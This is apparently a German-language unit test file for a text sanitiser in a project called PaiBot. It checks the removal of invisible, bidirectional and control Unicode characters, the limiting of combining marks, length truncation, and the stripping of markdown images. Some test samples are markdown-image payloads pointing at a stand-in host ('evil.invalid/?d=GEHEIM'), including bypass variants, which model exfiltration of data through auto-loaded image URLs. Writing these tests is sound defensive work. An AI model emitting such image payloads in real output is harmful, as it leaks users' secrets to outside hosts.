/**
 * PaiBot – Test: Bereinigung fremden Texts (unsichtbare Zeichen, Bilder, Länge, Zeit).
 *
 * @author    Oliver Hees
 * @link      https://paibot.de
 * @copyright 2026 Oliver Hees. Alle Urheberrechte liegen beim Autor.
 * @license   PaiBot Fair-Code-Lizenz 1.1 – siehe Datei LICENSE im Projektstamm
 * @since     2026-11-22
 */

import { describe, expect, it } from "vitest";
import { bereinigeText, entferneMarkdownBilder, MAX_KOMBINATIONSZEICHEN } from "./bereinigen";

const BESCHREIBUNG = { maxZeichen: 1_000, zeilenumbrueche: true };
const NAME = { maxZeichen: 128, zeilenumbrueche: false };

describe("bereinigeText", () => {
  it("entfernt Zeichen ohne Breite, Umkehr-Zeichen, Tags und Variationsauswahl", () => {
    const roh = `Hallo​ ‮Welt‬⁦!﻿\u{e0041}\u{e0100}­⁠`;
    const ergebnis = bereinigeText(roh, NAME);
    expect(ergebnis.text).toBe("Hallo Welt!");
    expect(ergebnis.veraendert).toBe(true);
  });

  it("entfernt Steuerzeichen, behält aber den Zeilenumbruch einer Beschreibung", () => {
    const ergebnis = bereinigeText("Zeile 1\u0000\u0007\r\nZeile 2\u009f Zeile 3", BESCHREIBUNG);
    expect(ergebnis.text).toBe("Zeile 1\nZeile 2\nZeile 3");
  });

  it("macht in Namen und Feldern aus Zeilenumbrüchen und Tabs ein Leerzeichen", () => {
    expect(bereinigeText("a\n\n b\tc d", NAME).text).toBe("a b c d");
  });

  it("entfernt einzelne Ersatz-Hälften, behält aber Emoji", () => {
    expect(bereinigeText("a\ud800b😀c\udc00", NAME).text).toBe("ab😀c");
  });

  it("entfernt Markdown-Bilder, auch mit Verweis-Namen", () => {
    expect(bereinigeText("vorher ![x](https://example.invalid/p.png) nachher", NAME).text).toBe(
      "vorher nachher",
    );
    expect(bereinigeText("a ![alt][ref] b", NAME).text).toBe("a b");
    expect(bereinigeText("kein ![bild ohne ende", NAME).text).toBe("kein ! [bild ohne ende");
  });

  describe("Markdown-Bilder lassen sich nicht umgehen", () => {
    const GEHEIM = "https://evil.invalid/?d=GEHEIM";
    const PROBEN: Record<string, string> = {
      "verschachtelte Klammern": `![x [y] z](${GEHEIM})`,
      "Bild, das erst nach dem Entfernen entsteht": `!![x](y)[z](${GEHEIM})`,
      "mehrfach verschachtelt entstehendes Bild": `!!![a](b)![c](d)[z](${GEHEIM})`,
      "Kurz-Verweis mit Definition": `![r]\n\n[r]: ${GEHEIM}`,
      "Verweis mit Namen": `![alt][r]\n\n[r]: ${GEHEIM}`,
      "ohne schließende Klammer": `![x](${GEHEIM}`,
      "viele Anfänge hintereinander": `${"![".repeat(500)}](${GEHEIM})`,
    };
    for (const [name, roh] of Object.entries(PROBEN)) {
      it(`${name}`, () => {
        for (const optionen of [NAME, BESCHREIBUNG]) {
          expect(bereinigeText(roh, optionen).text).not.toContain("![");
        }
      });
    }

    it("lässt Wörter mit Ausrufezeichen und eckigen Klammern sonst stehen", () => {
      expect(bereinigeText("Achtung! [Hinweis] folgt", NAME).text).toBe("Achtung! [Hinweis] folgt");
    });

    it("braucht für sehr lange Eingaben nur lineare Zeit", () => {
      const start = performance.now();
      const text = bereinigeText("![a".repeat(300_000), {
        maxZeichen: 1_000_000,
        zeilenumbrueche: false,
      }).text;
      expect(text).not.toContain("![");
      expect(performance.now() - start).toBeLessThan(5_000);
    });
  });

  describe("weitere unerwünschte Zeichen", () => {
    it.each([
      ["Zeichen aus dem privaten Bereich", "a\ue000b\u{f0000}c\u{10fffd}d"],
      ["Nicht-Zeichen", "a\ufffeb\uffffc\ufdd0d\u{1fffe}e"],
      [
        "Steuer-Zeichen für ägyptische Schrift ab U+13430",
        "a\u{13430}b\u{13438}c\u{1343f}d\u{13455}e",
      ],
      ["Objekt-Ersatzzeichen", "a\ufffcb"],
      ["nicht vergebene Code-Punkte", "a\u0378b\u{e0fff}c"],
    ])("entfernt %s", (_name, roh) => {
      const ergebnis = bereinigeText(roh, NAME);
      expect(ergebnis.text).toMatch(/^a ?b?c?d?e?$/);
      expect(ergebnis.text).not.toMatch(/[\p{Co}\p{Cn}\p{Cf}\ufffc]/u);
      expect(ergebnis.veraendert).toBe(true);
    });

    it("begrenzt Kombinationszeichen hinter einem Grundzeichen", () => {
      const zalgo = `a${"\u0301".repeat(200)}b`;
      const ergebnis = bereinigeText(zalgo, NAME);
      expect(ergebnis.text).toBe(`a${"\u0301".repeat(MAX_KOMBINATIONSZEICHEN)}b`);
      expect(ergebnis.veraendert).toBe(true);
    });

    it("lässt übliche Schrift mit wenigen Kombinationszeichen unverändert", () => {
      for (const text of [
        "Café",
        "cafe\u0301",
        "ạ̈",
        "Tiếng Việt",
        "हिन्दी",
        "ไม้โท",
        "한국어",
        "日本語",
      ]) {
        expect(bereinigeText(text.normalize("NFD"), NAME).text).toBe(text.normalize("NFD"));
      }
    });
  });

  it("kürzt auf die Höchstlänge, mit Marke, und schneidet kein Emoji entzwei", () => {
    const ergebnis = bereinigeText("😀".repeat(50), {
      maxZeichen: 11,
      zeilenumbrueche: false,
      kuerzungsMarke: "…",
    });
    expect(ergebnis.gekuerzt).toBe(true);
    expect(ergebnis.text.length).toBeLessThanOrEqual(11);
    expect(/[\ud800-\udbff](?![\udc00-\udfff])/.test(ergebnis.text)).toBe(false);
    expect(ergebnis.text.endsWith("…")).toBe(true);
  });

  it("lässt gewöhnlichen Text unverändert", () => {
    const ergebnis = bereinigeText("Gibt den Text zurück, schnell & sicher (äöü ß).", NAME);
    expect(ergebnis).toEqual({
      text: "Gibt den Text zurück, schnell & sicher (äöü ß).",
      veraendert: false,
      gekuerzt: false,
    });
  });

  it("bleibt bei sehr langen und verwinkelten Eingaben schnell und werft nie", () => {
    const eingaben = [
      "![".repeat(2_000_000),
      "![a](".repeat(500_000),
      `![${"x".repeat(1_000_000)}`,
      "​".repeat(3_000_000),
      "a".repeat(5_000_000),
    ];
    for (const eingabe of eingaben) {
      const ergebnis = bereinigeText(eingabe, BESCHREIBUNG);
      expect(ergebnis.text.length).toBeLessThanOrEqual(1_000);
    }
  });
});

describe("entferneMarkdownBilder", () => {
  it("entfernt mehrere Bilder hintereinander und lässt Links stehen", () => {
    const ergebnis = entferneMarkdownBilder("![a](x)[Link](y)![b](z)!");
    expect(ergebnis).toEqual({ text: "[Link](y)!", entfernt: true });
  });

  it("verändert Text ohne Bilder nicht", () => {
    expect(entferneMarkdownBilder("Hallo! [x](y)")).toEqual({
      text: "Hallo! [x](y)",
      entfernt: false,
    });
  });
});
